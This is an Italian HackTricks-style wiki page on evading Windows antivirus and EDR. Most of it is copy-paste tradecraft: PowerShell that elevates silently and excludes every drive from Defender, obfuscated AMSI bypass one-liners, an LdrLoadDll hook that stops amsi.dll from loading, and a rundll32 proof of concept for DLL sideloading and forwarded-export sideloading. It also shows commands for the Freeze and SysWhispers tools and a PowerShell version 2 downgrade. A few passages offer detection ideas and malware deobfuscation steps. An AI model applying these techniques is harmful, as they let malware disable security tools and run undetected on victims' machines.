# Bypass dell'Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire il funzionamento di Windows Defender simulando la presenza di un altro AV.
- [Disabilitare Defender se si è admin](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per game cheats vengono spesso distribuiti come installer Node.js/Nexe non firmati, che prima **chiedono all'utente l'elevazione dei privilegi** e solo dopo neutralizzano Defender. Il flusso è semplice:

1. Verificare la presenza di un contesto amministrativo con `net session`. Il comando ha successo solo quando il chiamante dispone dei diritti di amministratore, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviare immediatamente sé stesso con il verbo `RunAs` per attivare il previsto prompt di consenso UAC, preservando al contempo la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di installare software “cracked”, quindi il prompt viene generalmente accettato, fornendo al malware i diritti necessari per modificare la policy di Defender.<sup>[[26]](#references)</sup>

### Esclusioni `MpPreference` indiscriminate per ogni lettera di unità

Una volta ottenuti i privilegi elevati, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare completamente il servizio. Il loader termina prima il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`), quindi imposta **esclusioni estremamente ampie**, rendendo non scansionabili ogni profilo utente, directory di sistema e disco rimovibile:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni chiave:

- Il ciclo attraversa ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro depositato ovunque sul disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è lungimirante: gli attacker si riservano la possibilità di caricare driver non firmati in seguito senza dover modificare nuovamente Defender.
- Tutte le modifiche vengono applicate sotto `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo agli stage successivi di confermare che le esclusioni persistano o di ampliarle senza riattivare UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli superficiali dello stato continuano a segnalare “antivirus attivo”, anche se l'ispezione in tempo reale non analizza mai quei percorsi.<sup>[[26]](#references)</sup>

## **Metodologia di Evasione degli AV**

Attualmente, gli AV utilizzano metodi diversi per verificare se un file è malevolo o meno: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico si ottiene segnalando stringhe malevole note o array di byte all'interno di un binario o script, oltre a estrarre informazioni dal file stesso (ad esempio descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Questo significa che l'utilizzo di tool pubblici noti può farti rilevare più facilmente, poiché probabilmente sono già stati analizzati e classificati come malevoli. Esistono alcuni modi per aggirare questo tipo di rilevamento:

- **Cifratura**

Se cifri il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di una sorta di loader per decifrare ed eseguire il programma in memoria.

- **Offuscamento**

A volte è sufficiente modificare alcune stringhe nel binario o nello script per superare l'AV, ma può essere un'attività dispendiosa in termini di tempo, a seconda di ciò che stai cercando di offuscare.

- **Tool personalizzati**

Se sviluppi i tuoi tool, non saranno presenti signature malevole note, ma ciò richiede molto tempo e impegno.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica divide il file in più segmenti e chiede a Defender di analizzarli singolarmente; in questo modo può dirti esattamente quali stringhe o byte del tuo binario sono stati segnalati.

Ti consiglio vivamente di dare un'occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull'AV Evasion pratica.

### **Analisi dinamica**

L'analisi dinamica si verifica quando l'AV esegue il tuo binario in una sandbox e osserva eventuali attività malevole (ad esempio tentare di decifrare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più complessa, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Attendere prima dell'esecuzione** A seconda di come viene implementato, può essere un ottimo modo per bypassare l'analisi dinamica dell'AV. Gli AV hanno un tempo molto breve per analizzare i file, in modo da non interrompere il workflow dell'utente; di conseguenza, utilizzare attese prolungate può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare l'attesa, a seconda di come viene implementata.
- **Controllare le risorse della macchina** Di solito le sandbox hanno pochissime risorse a disposizione (ad esempio < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Anche in questo caso puoi essere molto creativo, per esempio controllando la temperatura della CPU o persino la velocità delle ventole: non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi colpire un utente la cui workstation è collegata al dominio "contoso.local", puoi controllare il dominio del computer per verificare che corrisponda a quello specificato; in caso contrario, puoi fare in modo che il programma termini.

È emerso che il computername della Sandbox di Microsoft Defender è HAL9TH; puoi quindi verificare il nome del computer nel tuo malware prima della detonazione. Se il nome corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender, quindi puoi fare in modo che il programma termini.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi suggerimenti di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come abbiamo già detto in questo post, i **tool pubblici** prima o poi verranno **rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi eseguire il dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti utilizzare un progetto diverso, meno conosciuto, che esegua anch'esso il dump di LSASS?

La risposta corretta probabilmente è la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware, se non il malware, più segnalati dagli AV e dagli EDR; sebbene il progetto in sé sia davvero interessante, è anche un incubo da utilizzare per aggirare gli AV. Cerca quindi alternative per ciò che stai cercando di ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasion, assicurati di **disattivare l'invio automatico dei sample** in Defender e, per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere l'evasion nel lungo periodo. Se vuoi verificare se il tuo payload viene rilevato da uno specifico AV, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXE vs DLL

Quando possibile, **dai sempre priorità all'utilizzo delle DLL per l'evasion**; secondo la mia esperienza, i file DLL vengono solitamente **rilevati e analizzati molto meno**, quindi in alcuni casi è un trucco molto semplice per evitare il rilevamento (se naturalmente il tuo payload può essere eseguito come DLL).

Come possiamo vedere in questa immagine, un DLL Payload di Havoc ha un detection rate di 4/26 su antiscan.me, mentre il payload EXE ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload EXE di Havoc e una normale DLL di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi utilizzare con i file DLL per renderli molto più stealth.

## DLL Sideloading & Proxying

Il **DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal loader, posizionando l'applicazione vittima e i payload malevoli affiancati.

Puoi verificare quali programmi sono vulnerabili al DLL Sideloading utilizzando [Siofra](https://github.com/Cybereason/siofra) e il seguente script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando restituirà l'elenco dei programmi vulnerabili al DLL hijacking all'interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**; se eseguita correttamente, questa tecnica è piuttosto stealth, ma se utilizzi programmi DLL Sideloadable conosciuti pubblicamente, potresti essere scoperto facilmente.

Il semplice fatto di inserire una DLL malevola con il nome della DLL che un programma si aspetta di caricare non farà eseguire il tuo payload, poiché il programma si aspetta che all'interno di quella DLL siano presenti funzioni specifiche. Per risolvere questo problema, utilizzeremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate effettuate da un programma dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e consentendo di gestire l'esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente di una DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Sfruttare gli Export Inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che sono in realtà dei "forwarder": invece di puntare al codice, la voce di export contiene una stringa ASCII nella forma `TargetDll.TargetFunc`. Quando un chiamante risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già stato caricato
- Risolve `TargetFunc` al suo interno

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dal namespace protetto KnownDLLs (ad esempio ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` non è una KnownDLL, viene utilizzato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la risoluzione del forward.

Questo abilita una primitive di sideloading indiretta: trovare una DLL firmata che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, quindi collocare la DLL firmata insieme a una DLL controllata dall'attaccante denominata esattamente come il modulo target inoltrato. Quando viene richiamato l'export inoltrato, il loader risolve il forward e carica la DLL dalla stessa directory, eseguendo il suo DllMain.<sup>[[13]](#references)</sup>

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene risolta tramite il normale ordine di ricerca.

PoC (copy-paste):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Posiziona una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un DllMain minimale per ottenere l'esecuzione del codice; non è necessario implementare la funzione inoltrata per attivare DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forwarding con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (signed) carica il side-by-side `keyiso.dll` (signed)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica quindi `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, viene visualizzato un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export inoltrati il cui modulo di destinazione non è una KnownDLL. Le KnownDLL sono elencate in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export inoltrati con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l’inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idee per il rilevamento/la difesa:
- Monitora i LOLBins (ad es. `rundll32.exe`) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di KnownDLLs con lo stesso nome di base da quella directory
- Genera un alert per catene processo/modulo come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` in percorsi scrivibili dall’utente
- Applica policy di integrità del codice (WDAC/AppLocker) e nega i permessi di scrittura+esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un payload toolkit per bypassare gli EDR usando processi sospesi, syscall dirette e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'Evasion è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo tool; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Gli EDR spesso applicano **user-mode inline hooks** agli stub delle syscall di `ntdll.dll`. Per bypassare questi hook, puoi generare stub di syscall **direct** o **indirect** che caricano il corretto **SSN** (System Service Number) ed effettuano la transizione alla kernel mode senza eseguire l'entrypoint dell'export sottoposto a hook.<sup>[[32]](#references)</sup>

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (nessun accesso all'export di `ntdll`).
- **Indirect**: esegue un salto verso un gadget `syscall` esistente all'interno di `ntdll`, facendo apparire la transizione al kernel come originata da `ntdll` (utile per l'evasion basata su euristiche); **randomized indirect** seleziona un gadget da un pool a ogni chiamata.
- **Egg-hunt**: evita di incorporare su disco la sequenza di opcode statica `0F 05`; la sequenza syscall viene risolta a runtime.

**Strategie di risoluzione degli SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub delle syscall in base all'indirizzo virtuale invece di leggere i byte dello stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dalla sua sezione `.text`, quindi la smappa (bypassando tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento degli indirizzi virtuali con la validazione degli opcode quando uno stub è pulito; esegue il fallback alla deduzione tramite indirizzo virtuale se lo stub è sottoposto a hook.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e usa un VEH per acquisire l'SSN da `EAX` a runtime, senza analizzare i byte sottoposti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di eseguire la scansione solo dei **file su disco**, quindi, se si riusciva in qualche modo a eseguire i payload **direttamente in-memory**, l'AV non poteva fare nulla per impedirlo, poiché non disponeva di una visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- User Account Control, o UAC (elevazione di EXE, COM, MSI o installazione di ActiveX)
- PowerShell (script, uso interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di ispezionare il comportamento degli script, esponendone il contenuto in una forma non criptata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert su Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Si noti come anteponga `amsi:` e poi il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati rilevati in-memory a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito tramite AMSI. Questo riguarda persino `Assembly.Load(byte[])` per caricare un'esecuzione in-memory. Per questo motivo, per l'esecuzione in-memory è consigliato utilizzare versioni inferiori di .NET (come la 4.7.2 o precedenti) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente con rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se presentano più livelli di offuscamento, quindi l'obfuscation potrebbe essere una cattiva opzione, a seconda di come viene eseguita. Questo rende l'elusione tutt'altro che immediata. A volte, però, è sufficiente modificare un paio di nomi di variabili e il problema è risolto; dipende quindi da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo di powershell (e anche in cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche quando si esegue il codice come utente senza privilegi. A causa di questo difetto nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione di AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Questa tecnica è stata originariamente divulgata da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un utilizzo più esteso.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una sola riga di codice PowerShell per rendere AMSI inutilizzabile per il processo PowerShell corrente. Questa riga è stata ovviamente rilevata da AMSI stesso, quindi è necessaria qualche modifica per poter utilizzare questa tecnica.

Ecco un bypass di AMSI modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente verrà segnalato una volta pubblicato questo post, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere undetected.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nell'individuare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni che restituiscano il codice per E_INVALIDARG; in questo modo, il risultato della scansione effettiva sarà 0, che viene interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche utilizzate per bypassare AMSI con powershell; consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'impostare un hook in user-mode su `ntdll!LdrLoadDll` che restituisca un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e non vengono eseguite scansioni per quel processo.<sup>[[23]](#references)</sup>

Schema di implementazione (pseudocodice x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e custom loader alike (qualsiasi cosa che altrimenti caricherebbe AMSI).
- Da combinare con l'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti lunghi nella command line.
- È stato usato con loader eseguiti tramite LOLBins (ad esempio, `regsvr32` che chiama `DllRegisterServer`).

Lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera inoltre script per bypassare AMSI.
Lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera inoltre script per bypassare AMSI evitando le signature tramite funzioni definite dall'utente randomizzate, variabili, espressioni di caratteri e applicando una capitalizzazione casuale dei caratteri alle keyword di PowerShell per evitare le signature.

**Rimuovi la signature rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della signature AMSI e sovrascrivendola quindi con istruzioni NOP, rimuovendola di fatto dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare un elenco dei prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano analizzati da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## Logging di PS

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per attività di auditing e troubleshooting, ma può anche rappresentare un **problema per gli attacker che vogliono eludere il rilevamento**.

Per bypassare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare PowerShell Transcription e Module Logging**: puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) a questo scopo.
- **Usare Powershell versione 2**: se usi PowerShell versione 2, AMSI non verrà caricato, quindi potrai eseguire i tuoi script senza che vengano sottoposti a scansione da AMSI. Puoi farlo così: `powershell.exe -version 2`
- **Usare una sessione Powershell Unmanaged**: usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per avviare una powershell senza difese (è ciò che usa `powerpick` di Cobal Strike).


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla crittografia dei dati, aumentando l'entropia del binary e rendendo più facile per gli AV e gli EDR rilevarlo. Fai attenzione e valuta di applicare la crittografia solo a sezioni specifiche del tuo codice che contengono informazioni sensibili o devono essere nascoste.

### Deoffuscare i binary .NET protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune incontrare diversi livelli di protezione che bloccano decompiler e sandbox. Il workflow seguente **ripristina un IL quasi originale**, che può successivamente essere decompilato in C# con strumenti come dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1. Rimozione dell'anti-tampering – ConfuserEx cifra ogni *method body* e lo decritta all'interno del *module* static constructor (`<Module>.cctor`). Inoltre modifica il checksum PE, quindi qualsiasi modifica causerà il crash del binary. Usa **AntiTamperKiller** per individuare le tabelle dei metadati cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`), che possono essere utili per creare un tuo unpacker.

2. Recupero dei simboli e del control flow – fornisci il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà i namespace, le classi e i nomi delle variabili originali e decritterà le stringhe costanti.

3. Rimozione delle proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (chiamati anche *proxy calls*) per compromettere ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4. Pulizia manuale – esegui il binary risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il payload *reale*. Spesso il malware lo memorizza come un byte array codificato TLV inizializzato all'interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza dover eseguire il sample malevolo**, risultando utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx genera un attributo custom chiamato `ConfusedByAttribute`, che può essere usato come IOC per eseguire automaticamente il triage dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire una maggiore sicurezza del software attraverso la [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e la protezione contro le manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come utilizzare il linguaggio `C++11/14` per generare, durante la compilazione, codice offuscato senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework di template metaprogramming di C++, rendendo un po' più difficile la vita a chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un binary obfuscator x64 in grado di offuscare diversi pe file, tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorphic per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation granulare per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di assembly trasformando le istruzioni normali in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
